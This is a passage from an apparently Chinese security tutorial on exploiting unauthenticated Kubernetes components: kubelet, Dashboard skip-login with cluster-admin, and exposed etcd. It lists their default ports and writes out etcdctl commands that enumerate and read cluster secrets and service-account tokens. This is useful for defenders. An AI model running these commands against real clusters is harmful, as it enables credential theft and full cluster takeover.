<a href="http://dockone.io/uploads/article/20211111/674f649d97c21c6abd7214874a6a731e.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/674f649d97c21c6abd7214874a6a731e.png" class="img-polaroid" title="13.png" alt="13.png" referrerpolicy="no-referrer"></a>
</div>
</li><li><br>kubectl create -f pod.yaml // sa pod<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/08dddaaaec13fa1d6a934d7110a00635.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/08dddaaaec13fa1d6a934d7110a00635.png" class="img-polaroid" title="14.png" alt="14.png" referrerpolicy="no-referrer"></a>
</div>
</li><li><br>./kubectl .</li></ul><br>
<br><h4>容器组件未鉴权</h4><ul><li>kube-apiserver: 6443, 8080  </li><li>kubectl proxy: 8080, 8081</li><li>kubelet: 10250, 10255, 4149</li><li>dashboard: 30000</li><li>docker api: 2375</li><li>etcd: 2379, 2380</li><li>kube-controller-manager: 10252</li><li>kube-proxy: 10256, 31442</li><li>kube-scheduler: 10251</li><li>weave: 6781, 6782, 6783</li><li>kubeflow-dashboard: 8080</li></ul><br>
<br><strong>组件分工</strong><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/f0500f540b3692423cd5da65e9388c37.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/f0500f540b3692423cd5da65e9388c37.jpg" class="img-polaroid" title="15.jpg" alt="15.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<ul><li>用户与kubectl或者Kubernetes Dashboard进行交互，提交需求。（例： kubectl create -f pod.yaml）</li><li>kubectl会读取~/.kube/config配置，并与apiserver进行交互，协议：http/https</li><li>apiserver会协同etcd等组件准备下发新建容器的配置给到节点，协议：http/https（除etcd外还有例如kube-controller-manager，scheduler等组件用于规划容器资源和容器编排方向）</li><li>apiserver与kubelet进行交互，告知其容器创建的需求，协议：http/https</li><li>kubelet与Docker等容器引擎进行交互，创建容器，协议：http/unix socket</li></ul><br>
<br><strong>API Server</strong><br>
<br>默认情况下，apiserver都是有鉴权的。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/27296196a2e4792906e39804a4e0b143.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/27296196a2e4792906e39804a4e0b143.png" class="img-polaroid" title="16.png" alt="16.png" referrerpolicy="no-referrer"></a>
</div>
<br>
但也有未鉴权的配置，此时请求接口的结果如下：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/75ac2a0198a395a0a0f22e5c4f1169e0.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/75ac2a0198a395a0a0f22e5c4f1169e0.png" class="img-polaroid" title="17.png" alt="17.png" referrerpolicy="no-referrer"></a>
</div>
<br>
对于这类的未鉴权的设置来说，访问到apiserver一般情况下就获取了集群的权限。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/eadf97135fd8a5ce1fcbac9eb24584bf.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/eadf97135fd8a5ce1fcbac9eb24584bf.jpg" class="img-polaroid" title="18.jpg" alt="18.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<br><strong>Kubelet</strong><br>
<br>每一个Node节点都有一个kubelet服务，kubelet监听了10250，10248，10255等端口。<br>
<br>其中10250端口是kubelet与apiserver进行通信的主要端口，通过该端口kubelet可以知道自己当前应该处理的任务，该端口在最新版Kubernetes是有鉴权的，但在开启了接受匿名请求的情况下，不带鉴权信息的请求也可以使用10250提供的能力。<br>
<br>在新版本Kubernetes中当使用以下配置打开匿名访问时便可能存在kubelet未授权访问漏洞：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/5b1031e8b23e282db34b3a4a69aafc1c.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/5b1031e8b23e282db34b3a4a69aafc1c.png" class="img-polaroid" title="19.png" alt="19.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/a562f12efdfdb195687790ec2f9d4a99.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/a562f12efdfdb195687790ec2f9d4a99.png" class="img-polaroid" title="20.png" alt="20.png" referrerpolicy="no-referrer"></a>
</div>
<br>
执行命令：<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/62e69ac473085763be91b13044c5b14d.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/62e69ac473085763be91b13044c5b14d.png" class="img-polaroid" title="21.png" alt="21.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/a009b7942cf59504a500cc4ede681e32.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/a009b7942cf59504a500cc4ede681e32.png" class="img-polaroid" title="22.png" alt="22.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<strong>Dashboard</strong><br>
<br>Dashboard是Kubernetes官方推出的控制Kubernetes的图形化界面，在Kubernetes配置不当导致Dashboard未授权访问漏洞的情况下，通过Dashboard我们可以控制整个集群。<br>
<br>在Dashboard中默认是存在鉴权机制的，用户可以通过kubeconfig或者Token两种方式登录，当用户开启了enable-skip-login时可以在登录界面点击Skip跳过登录进入Dashboard。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/1d27aeb982087f51adbf4749e650f4c9.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/1d27aeb982087f51adbf4749e650f4c9.png" class="img-polaroid" title="23.png" alt="23.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/21ecfedaf1c58a33b3c5f5b3bd85152a.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/21ecfedaf1c58a33b3c5f5b3bd85152a.png" class="img-polaroid" title="24.png" alt="24.png" referrerpolicy="no-referrer"></a>
</div>
<br>
然而通过点击Skip进入Dashboard默认是没有操作集群的权限的，因为Kubernetes使用RBAC（Role-based access control）机制进行身份认证和权限管理，不同的serviceaccount拥有不同的集群权限。<br>
<br>我们点击Skip进入Dashboard实际上使用的是Kubernetes-dashboard这个ServiceAccount，如果此时该ServiceAccount没有配置特殊的权限，是默认没有办法达到控制集群任意功能的程度的。<br>
<br>但有些开发者为了方便或者在测试环境中会为Kubernetes-dashboard绑定cluster-admin这个ClusterRole（cluster-admin拥有管理集群的最高权限）。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/91bd28d035690e11a0a31cb78affc353.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/91bd28d035690e11a0a31cb78affc353.png" class="img-polaroid" title="25.png" alt="25.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/46b88e7dc0d0cb7969a419fa1c512a6a.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/46b88e7dc0d0cb7969a419fa1c512a6a.jpg" class="img-polaroid" title="26.jpg" alt="26.jpg" referrerpolicy="no-referrer"></a>
</div>
<br>
<strong>etcd</strong><br>
<br>etcd被广泛用于存储分布式系统或机器集群数据，其默认监听了2379等端口，如果2379端口暴露，可能造成敏感信息泄露。<br>
<br>Kubernetes默认使用了etcd v3来存储数据，如果我们能够控制Kubernetes etcd服务，也就拥有了整个集群的控制权。<br>
<pre class="prettyprint">export ETCDCTL_API=3<br>
etcdctl endpoint health<br>
etcdctl get / --prefix --keys-only | grep /secrets/<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/7e80182138c2be4dd3dccc82e08a81e1.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/7e80182138c2be4dd3dccc82e08a81e1.png" class="img-polaroid" title="27.png" alt="27.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<pre class="prettyprint">etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-pkkd5<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/0db34a971b866b3bfdc4fdcf246f4391.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/0db34a971b866b3bfdc4fdcf246f4391.png" class="img-polaroid" title="28.png" alt="28.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/65f3c3c8552ad53052bcd3407c8fe4c2.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/65f3c3c8552ad53052bcd3407c8fe4c2.png" class="img-polaroid" title="29.png" alt="29.png" referrerpolicy="no-referrer"></a>
</div>
<br>
参考链接：<br>
<ul><li><a href="https://xz.aliyun.com/t/6167" rel="nofollow" target="_blank">https://xz.aliyun.com/t/6167</a></li><li><a href="https://mp.weixin.qq.com/s/Aq8RrH34PTkmF8lKzdY38g" rel="nofollow" target="_blank">https://mp.weixin.qq.com/s/Aq8RrH34PTkmF8lKzdY38g</a></li><li><a href="https://tech.meituan.com/2020/03/12/cloud-native-security.html" rel="nofollow" target="_blank">https://tech.meituan.com/2020/ ... .html</a></li></ul><br>
<br>原文链接：<a href="https://mp.weixin.qq.com/s/WaRECg79Nxx08iekakrlMA" rel="nofollow" target="_blank">https://mp.weixin.qq.com/s/WaRECg79Nxx08iekakrlMA</a>
                                                                <div class="aw-upload-img-list">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </div>
                                
                                                                <ul class="aw-upload-file-list">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </ul>
                                                              
</div>
            